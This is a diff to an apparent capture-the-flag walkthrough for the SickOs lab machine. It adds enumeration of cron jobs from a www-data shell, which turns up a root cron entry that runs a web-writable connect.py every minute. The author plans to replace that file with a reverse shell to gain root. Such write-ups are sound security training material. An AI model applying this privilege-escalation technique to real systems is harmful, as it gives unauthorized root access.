@@ -252,7 +252,68 @@ print "I Try to connect things very frequently\n"
 print "You may want to try my services"
 ```
 
-I just guess it was a cron job and it could be modified by anyone!!!.
+I just guess it was a cron job. Let check it out: 
+```
+www-data@SickOs:/var/www$ ls -alR /etc/cron*
+ls -alR /etc/cron*
+-rw-r--r-- 1 root root  722 Jun 20  2012 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Dec  5  2015 .
+drwxr-xr-x 90 root root 4096 Dec 14 20:41 ..
+-rw-r--r--  1 root root  102 Jun 20  2012 .placeholder
+-rw-r--r--  1 root root   52 Dec  5  2015 automate
+-rw-r--r--  1 root root  544 Jul  2  2015 php5
+
+/etc/cron.daily:
+total 76
+drwxr-xr-x  2 root root  4096 Sep 22  2015 .
+drwxr-xr-x 90 root root  4096 Dec 14 20:41 ..
+-rw-r--r--  1 root root   102 Jun 20  2012 .placeholder
+-rwxr-xr-x  1 root root   633 Jul 24  2015 apache2
+-rwxr-xr-x  1 root root   219 Apr 10  2012 apport
+-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
+-rwxr-xr-x  1 root root   314 Apr 19  2013 aptitude
+-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
+-rwxr-xr-x  1 root root   372 Oct  5  2011 logrotate
+-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
+-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+-rwxr-xr-x  1 root root   249 Sep 13  2012 passwd
+-rwxr-xr-x  1 root root  2417 Jul  2  2011 popularity-contest
+-rwxr-xr-x  1 root root  2947 Jun 20  2012 standard
+-rwxr-xr-x  1 root root   214 Sep 11  2012 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep 22  2015 .
+drwxr-xr-x 90 root root 4096 Dec 14 20:41 ..
+-rw-r--r--  1 root root  102 Jun 20  2012 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep 22  2015 .
+drwxr-xr-x 90 root root 4096 Dec 14 20:41 ..
+-rw-r--r--  1 root root  102 Jun 20  2012 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Sep 22  2015 .
+drwxr-xr-x 90 root root 4096 Dec 14 20:41 ..
+-rw-r--r--  1 root root  102 Jun 20  2012 .placeholder
+-rwxr-xr-x  1 root root  730 Sep 14  2013 apt-xapian-index
+-rwxr-xr-x  1 root root  907 Dec 28  2012 man-db
+```
+
+I found that at `/etc/cron.d/automate` it executes the `connect.py` automatically:
+```
+www-data@SickOs:/var/www$ cat /etc/cron.d/automate
+cat /etc/cron.d/automate
+
+* * * * * root /usr/bin/python /var/www/connect.py
+```
+
 So I would like to edit python file by change it to reverse shell and if it run I will got shell with root privilege.
 ```
 $ cat connect.py
